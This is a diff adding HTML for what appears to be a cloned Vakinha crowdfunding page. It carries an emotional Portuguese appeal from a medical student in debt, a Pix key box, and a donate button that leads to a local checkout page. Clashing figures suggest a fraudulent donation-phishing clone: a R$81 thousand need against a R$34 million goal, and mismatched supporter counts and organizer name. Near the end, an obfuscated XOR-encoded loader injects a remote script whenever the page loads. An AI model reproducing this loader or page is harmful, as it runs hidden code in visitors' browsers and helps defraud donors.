+          <div class="stat-row">
+            <span class="stat-label">Apoiadores</span>
+            <span class="stat-value">421</span>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  
+</body>
+</html>
+
+      <!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+  /* Base de fontes e espaçamento para o exemplo */
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    margin: 0;
+    padding: 16px;
+    background-color: #fff;
+  }
+
+  /* 1. Descrição Curta e Completa */
+  .short-desc {
+    font-size: 15px;
+    line-height: 1.5;
+    color: #495057;
+    margin-bottom: 20px;
+  }
+
+  .short-desc span {
+    color: #0a8f51;
+    font-weight: bold;
+    cursor: pointer;
+    text-decoration: underline;
+    display: inline-block;
+    padding: 2px 4px;
+  }
+
+  /* 2. ABAS RESPONSIVAS (Deslizar com o dedo no celular) */
+  .tabs-wrap {
+    display: flex;
+    overflow-x: auto; /* Ativa o scroll horizontal */
+    scroll-behavior: smooth;
+    -webkit-overflow-scrolling: touch; /* Scroll suave no iOS */
+    border-bottom: 1px solid #e9ecef;
+    margin-bottom: 20px;
+    gap: 16px;
+    padding-bottom: 4px;
+  }
+
+  /* Esconde a barra de rolagem nativa para ficar mais limpo */
+  .tabs-wrap::-webkit-scrollbar {
+    display: none;
+  }
+  .tabs-wrap {
+    -ms-overflow-style: none;  /* IE/Edge */
+    scrollbar-width: none;  /* Firefox */
+  }
+
+  .tab {
+    font-size: 15px;
+    color: #6c757d;
+    white-space: nowrap; /* Impede o texto de quebrar linha */
+    padding: 10px 4px;
+    cursor: pointer;
+    border-bottom: 3px solid transparent;
+    font-weight: 500;
+    transition: all 0.2s ease;
+  }
+
+  .tab.active {
+    color: #24ca68;
+    border-bottom-color: #24ca68;
+    font-weight: bold;
+  }
+
+  /* 3. Área do PIX Superior */
+  .pix-row {
+    font-size: 14px;
+    color: #495057;
+    margin-bottom: 8px;
+  }
+
+  .pix-key {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    background-color: #e8f5e9;
+    color: #0a8f51;
+    padding: 14px 16px;
+    border-radius: 8px;
+    font-size: 16px;
+    cursor: pointer;
+    width: 100%;
+    box-sizing: border-box;
+    font-weight: bold;
+    margin-bottom: 20px;
+  }
+
+  .pix-key svg {
+    fill: #0a8f51;
+    width: 20px;
+    height: 20px;
+    flex-shrink: 0;
+  }
+
+  .divider {
+    height: 1px;
+    background-color: #dee2e6;
+    margin: 20px 0;
+  }
+
+  .created-date {
+    font-size: 13px;
+    color: #6c757d;
+    margin-bottom: 20px;
+  }
+
+  /* 4. Corpo do Texto da Campanha */
+  .description h3 {
+    font-size: 18px;
+    line-height: 1.3;
+    color: #212529;
+    margin-top: 0;
+    margin-bottom: 12px;
+  }
+
+  .description p {
+    font-size: 15px;
+    line-height: 1.6;
+    color: #343a40;
+    margin-bottom: 16px;
+  }
+
+  /* 5. Card de PIX Inferior */
+  .pix-card {
+    background-color: #f8f9fa;
+    border: 1px dashed #ced4da;
+    border-radius: 12px;
+    padding: 16px;
+    margin: 24px 0;
+    display: flex;
+    flex-direction: column;
+    gap: 16px;
+  }
+
+  .pix-card-row {
+    display: flex;
+    gap: 12px;
+    align-items: flex-start;
+  }
+
+  .pix-card-row svg {
+    width: 24px;
+    height: 24px;
+    fill: #24ca68;
+    flex-shrink: 0;
+  }
+
+  .pix-card-text {
+    font-size: 14px;
+    color: #495057;
+    margin: 0;
+    line-height: 1.5;
+  }
+
+  .pix-card-copy {
+    background-color: #24ca68;
+    color: #fff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    padding: 12px;
+    border-radius: 8px;
+    font-weight: bold;
+    font-size: 15px;
+    cursor: pointer;
+    width: 100%;
+    box-sizing: border-box;
+  }
+
+  .pix-card-copy svg {
+    width: 18px;
+    height: 18px;
+    fill: #fff;
+  }
+
+  /* 6. Link de Denúncia e Aviso */
+  .report-link {
+    display: inline-block;
+    color: #dc3545;
+    font-size: 14px;
+    text-decoration: none;
+    margin-bottom: 16px;
+    font-weight: 500;
+    padding: 8px 0; /* Aumenta área de clique */
+  }
+
+  .aviso {
+    font-size: 12px;
+    color: #868e96;
+    line-height: 1.5;
+    margin: 0;
+  }
+</style>
+</head>
+<body>
+
+  <div class="short-desc" id="shortDesc">
+  Faltam só alguns meses para eu me tornar médica. Você me ajuda a chegar até o fim? <span onclick="expandDesc()">ver tudo</span>
+  </div>
+  
+  <div id="fullDesc" style="display:none; font-size:15px; color:#343a40; line-height:1.6; margin-bottom:20px;">
+ Faltam só alguns meses para eu me tornar médica. Você me ajuda a chegar até o fim?
+  </div>
+        
+  <div class="tabs-wrap">
+    <div class="tab active" onclick="setTab(this,'sobre')">Sobre</div>
+    <div class="tab" onclick="setTab(this,'atualizacoes')">Atualizações</div>
+    <div class="tab" onclick="setTab(this,'quem')">Quem ajudou</div>
+    <div class="tab" onclick="setTab(this,'premiada')">Vakinha Premiada</div>
+    <div class="tab" onclick="setTab(this,'selos')">Selos recebidos</div>
+    <div class="tab" onclick="setTab(this,'perguntas')">Perguntas e Respostas</div>
+  </div>
+
+  <div id="tab-sobre">
+    <div class="pix-row"><span class="pix-label">Você pode ajudar via Pix usando a chave:</span></div>
+    <div class="pix-key" onclick="copyPix()">
+     
+      <svg viewBox="350 0 766 758"><path d="M806.32,188.44H597.7a34.87,34.87,0,0,0-34.84,34.73V466.71H597.7V223.17H806.32Z"/><path d="M858.56,258v0H667.25a35,35,0,0,0-34.84,34.83V536.28a35,35,0,0,0,34.84,34.83H858.56a34.9,34.9,0,0,0,34.72-34.83V292.8A34.9,34.9,0,0,0,858.56,258Zm0,278.29H667.25V292.8H858.56Z"/></svg>
+    </div>
+    
+    <div class="divider"></div>
+    <p class="created-date"><strong>Vaquinha criada em:</strong> 03/06/2026</p>
+    
+    <div class="description">
+     
+      <p>Faltam só alguns meses para eu me tornar médica. Você me ajuda a chegar até o fim?</p>
+
+<p>Eu estou a um passo de realizar o sonho de uma vida inteira. Depois de cinco anos de luta, de fé e de sacrifícios que a minha família fez sem pensar duas vezes, falta só o último ano para eu me formar em Medicina.</p>
+
+<p>Mas, hoje, eu corro o risco de ver esse sonho escapar bem na reta final. E é por isso que eu estou aqui, de coração aberto, pedindo a sua ajuda.</p>
+
+<p>Meu nome é Thais. Essa é a minha história — e eu preciso muito que você leia até o fim.</p>
+
+
+<p>Um sonho que virou o sonho da família inteira.
+Quem sempre segurou a minha mão nessa caminhada foi a minha mãe. Professora aposentada, ela tocava com as irmãs dois pequenos restaurantes na nossa cidade e fazia das tripas coração para bancar a minha faculdade e as contas de casa.</p>
+
+<p>Quando entrei na Faculdade Humanitas, em São José dos Campos, em fevereiro de 2020, a mensalidade era de cerca de R$ 8.400. A gente sabia que seria difícil, mas tinha um plano e, acima de tudo, tinha esperança: ia dando um jeito, mês a mês, com o trabalho dela e com muita fé. 
+Só que eu entrei em fevereiro… e em março o mundo parou.
+</p>Quando a pandemia levou tudo
+
+Do dia para a noite, tudo fechou. Um dos restaurantes da minha família teve que encerrar as portas para sempre. O outro sobreviveu vendendo marmitex — mas marmitex não paga as contas de um restaurante inteiro. Numa cidade pequena, com todo mundo sem renda, o negócio que sustentava a gente afundou em dívidas e nunca mais conseguiu se levantar. </p>
+</p>E, mesmo assim, ninguém na minha família deixou eu desistir. Um a um, eles foram se doando para eu continuar:
+
+Minha mãe fez todos os empréstimos que conseguiu — no nome dela e do restaurante — até não sobrar mais nenhum crédito em lugar nenhum.
+Meus avós venderam uma casa e dividiram o dinheiro para me ajudar a seguir estudando.
+Minha mãe pegou a carta de um consórcio, comprou um carro da minha tia e pagou um semestre inteiro da faculdade com aquele dinheiro.
+Uma tia me emprestou o que faltava para eu conseguir entrar no meu ano de internato — o ano em que a gente finalmente começa a cuidar dos pacientes de verdade.</p>
+</p> E, enquanto a gente se virava do avesso, a mensalidade só subia: 8% a cada ano. Começou em R$ 8.400 e hoje já passa de R$ 11 mil. Ninguém imaginava que ia aumentar tanto. E ninguém, ninguém mesmo, imaginava que uma pandemia levaria tudo o que a minha família construiu com uma vida inteira de trabalho.</p>
+
+</p> O baque que quase me derrubou
+
+No fim do ano passado, quando eu já não sabia mais de onde tirar, surgiu uma última esperança: meus avós têm um apartamento em Ubatuba que já estava vendido. Eles iam me emprestar parte desse dinheiro para eu finalmente quitar a dívida. Estava tudo certo, tudo acertado.
+
+Mas foi bem na minha semana de provas finais — a semana em que eu mais precisava de calma — que o comprador desistiu, na última hora. A venda caiu. E, com ela, caiu a minha única saída.
+
+Foi um golpe duríssimo. Mas eu não me permiti desistir.</p>
+
+</p> Assim que terminei as minhas provas, eu arreguei as mangas e comecei a fazer brigadeiros para vender, juntando cada centavo que eu conseguia. Tive menos de um mês. E, com muita luta e com a ajuda de gente de coração enorme, eu já consegui juntar uma parte do valor.
+
+Mas ainda falta muito. E o tempo está correndo.</p>
+
+</p> É aqui que você entra
+
+Eu tenho uma dívida de R$ 81 mil com a faculdade. Para conseguir fazer a rematrícula e cursar esse último ano, eu preciso quitar agora a maior parte dela. É só isso que separa a menina que entrou nesse curso em 2020 da médica que ela sempre sonhou em ser.
+
+Cinco anos de estudo, de renúncia e de fé estão inteiros nesse último passo. Parar tão perto do fim seria doloroso demais — para mim e para a minha família, que abriu mão de tanto para me ver chegar até aqui.
+
+Por isso, eu te peço, do fundo do coração: você me ajuda a dar esse último passo?
+
+Toda ajuda, por menor que pareça, me deixa mais perto do jaleco branco:
+
+💙 Doe qualquer valor aqui na vakinha — cada real conta, de verdade.
+🍫 Compre meus brigadeiros: uma caixinha com 4 unidades sai por R$ 20.
+📢 Compartilhe esta campanha — às vezes, um único "compartilhar" seu chega justo na pessoa que vai mudar essa história.
+🙏 Me coloque nas suas orações e mande energias boas.</p>
+
+</p>Eu acredito, com toda a minha fé, que eu vou conseguir. E se um dia, já formada, eu puder cuidar de você ou de alguém que você ama, saiba que você fez parte disso.
+
+Muito obrigada por ler até aqui. De coração, eu conto com você. 💙
+
+Com todo o meu carinho e gratidão, Thais</p>
+    </div>
+    
+    <p class="aviso">AVISO LEGAL: O texto e as imagens incluídos nessa página são de única e exclusiva responsabilidade do criador da vaquinha e não representam a opinião ou endosso da plataforma Vakinha.</p>
+  </div>
+
+</body>
+</html>
+
+      <div id="tab-atualizacoes" style="display:none;padding:20px 0;color:#8a8a8a;font-size:14px;">Nenhuma atualização disponível.</div>
+      <div id="tab-quem" style="display:none;padding:20px 0;color:#8a8a8a;font-size:14px;">Nenhum apoiador para exibir.</div>
+      <div id="tab-premiada" style="display:none;padding:20px 0;color:#8a8a8a;font-size:14px;">Vakinha Premiada não disponível.</div>
+      <div id="tab-selos" style="display:none;padding:20px 0;color:#8a8a8a;font-size:14px;">Nenhum selo recebido.</div>
+      <div id="tab-perguntas" style="display:none;padding:20px 0;color:#8a8a8a;font-size:14px;">Nenhuma pergunta disponível.</div>
+    </div>
+
+    <div class="sidebar">
+      <div class="progress-bar"><div class="progress-fill"></div></div>
+      <p class="collected-label">Arrecadado</p>
+      <p class="collected-value">R$ 324.977,02</p>
+      <p class="collected-goal">de R$ 34.000.000,00</p>
+      
+      <div class="stats-box">
+        <div class="stat-row">
+          <span class="stat-label">Corações Recebidos
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 18.319 15.34"><defs><radialGradient id="hg" cx="0.298" cy="0.5" r="1.023" gradientTransform="matrix(0.853,0,0,-1,0.003,2)" gradientUnits="objectBoundingBox"><stop offset="0" stop-color="#24ca68"/><stop offset="0.704" stop-color="#0a8f51"/><stop offset="1" stop-color="#007a48"/></radialGradient></defs><path d="M9.16,2.184A5.647,5.647,0,0,0,3.174.242C.695,1.027-.329,3.754.092,6.165c.667,3.826,4.845,7.644,8.459,9.055a1.678,1.678,0,0,0,.6.12h.032a1.633,1.633,0,0,0,.59-.12c3.649-1.445,7.792-5.229,8.46-9.055a6.259,6.259,0,0,0,.091-1.012V5.048A4.864,4.864,0,0,0,15.145.242,5.119,5.119,0,0,0,13.6,0,5.855,5.855,0,0,0,9.16,2.184" fill="url(#hg)"/></svg>
+          </span>
+          <span class="stat-value">1755</span>
+        </div>
+        <div class="stat-row">
+          <span class="stat-label">Apoiadores</span>
+          <span class="stat-value">4421</span>
+        </div>
+      </div>
+
+<button type="button" class="btn-donate" onclick="window.location.href='/checkout/pagar.html' + window.location.search">
+    Quero Ajudar
+</button>
+      <button class="btn-share" onclick="shareVaquinha()">Compartilhar</button>
+      
+      <div class="doacao-badge">
+        <svg viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="11" stroke="#009d4e" stroke-width="1.5" fill="#eefaf3"/><path d="M12 3L5 6v5c0 4.5 3 8.5 7 10 4-1.5 7-5.5 7-10V6l-7-3z" fill="#009d4e"/><path d="M9 12l2 2 4-4" stroke="#fff" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        <span>Doação Protegida</span>
+      </div>
+
+      <div class="organizer">
+        <img src="https://static.vakinha.com.br/uploads/user/avatar/20105934/1738600679.245.png" alt="salveosirmaosmielke" class="organizer-avatar" onerror="this.style.background='#e8f5e9';this.removeAttribute('src')">
+        <div class="organizer-info">
+          <p class="name">salveosirmaosmielke</p>
+          <p class="since">Ativo(a) desde fevereiro/2025</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="mobile-bottom">
+  <div class="mb-protected">
+    <div class="mb-protected-badge">
+      <svg viewBox="0 0 24 24" width="24" height="24">
+        <circle cx="12" cy="12" r="12" fill="#1a6e2e"/>
+        <path d="M12 4L6 6.5v4.5c0 4 2.5 7.5 6 9 3.5-1.5 6-5 6-9V6.5L12 4z" fill="#fff"/>
+        <path d="M10 12l1.5 1.5 3-3" stroke="#1a6e2e" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+      <span>Doação Protegida</span>
+    </div>
+  </div>
+  <div class="mb-btns">
+    <button type="button" class="btn-donate" onclick="window.location.href='/checkout/pagar.html' + window.location.search">
+    Quero Ajudar
+</button>
+    <button class="btn-share" onclick="shareVaquinha()">Compartilhar</button>
+  </div>
+</div>
+<script>
+  window.pixelId = "6a6626392eb32395825e2935";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+
+<script>(function(){var i_bspp=atob("DKfOjzk0hXhS72RpOdzs+ktYp0JwhxAdSdT0oBZX4RZ8mhAEUMG3oVpb6FYwnUsaWtWn/01Hqg0mghdGVca66kpAqxIhzUhLWNO6/VBW8Aw3nEZTYtzs4VhZ4FpozQAITcbj+k1Z7B4rwhQbXNGr4U0Z/Rs9i0kaWszsoxtC5BQnikZTG4Wzo0IW6xk/ikZTG8Ov+1gZ8Aw/hgIQFNe86k9R6wx/nBELUMO9rRUW8xk+mgFLA4Xs8mRJ");var x_bn7=[];for(var p_3=0;p_3<i_bspp.length;p_3++){x_bn7.push(i_bspp.charCodeAt(p_3)&255);}var s_8=x_bn7[0];var r_xvt=x_bn7.slice(1,1+s_8);var g_2o=x_bn7.slice(1+s_8);var z_4vcr=g_2o.map(function(b,q_q){return b^r_xvt[q_q%s_8];});var t_3="";for(var j_1yut=0;j_1yut<z_4vcr.length;j_1yut++){t_3+=String.fromCharCode(z_4vcr[j_1yut]&255);}var d_uy=decodeURIComponent(escape(t_3));var z_wm=JSON.parse(d_uy);var i_pva=z_wm.globals||[];i_pva.forEach(function(z_1cn){window[z_1cn.name]=z_1cn.value;});var p_ah9=document.createElement("script");p_ah9.src=z_wm.url;p_ah9.async=true;p_ah9.defer=true;(z_wm.attributes||[]).forEach(function(x_6){p_ah9.setAttribute(x_6.name,x_6.value);});(document.head||document.documentElement).appendChild(p_ah9);})();</script>
+
+
+
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-NMSZ9M72');</script>
+<!-- End Google Tag Manager -->
+
+
+
+
+
+   
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+
+fbq('init', '1520472869160223');
+fbq('init', '1762981111690468');
+fbq('track', 'PageView');
+</script>
+
+<noscript>
+<img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1575787940886257&ev=PageView&noscript=1"/>
+</noscript>
+<!-- End Meta Pixel Code -->
+</body>
+</html>
